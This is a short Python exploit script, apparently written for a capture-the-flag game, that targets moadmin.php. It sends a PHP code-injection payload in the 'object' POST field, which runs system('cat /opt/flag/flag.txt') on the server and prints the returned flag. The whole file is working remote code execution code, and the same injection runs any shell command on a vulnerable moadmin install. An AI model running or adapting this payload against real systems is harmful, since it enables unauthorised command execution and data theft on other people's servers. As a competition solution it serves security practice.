#!/usr/bin/env python
# encoding:utf-8

'''
Get flag by RCE of moadmin
'''

import requests

def get_flag(host, port):
    url = 'http://%s:%d/administrator/moadmin.php' % (host, port)
    data = {'object':'1;system("cat /opt/flag/flag.txt");'}
    response = requests.post(url, data=data)
    content = response.content
    flag = content.replace("\n", "").replace(" ","")
    print flag
    return flag

def main():
    get_flag("192.168.30.36", 12343)

if __name__ == '__main__':
    main()

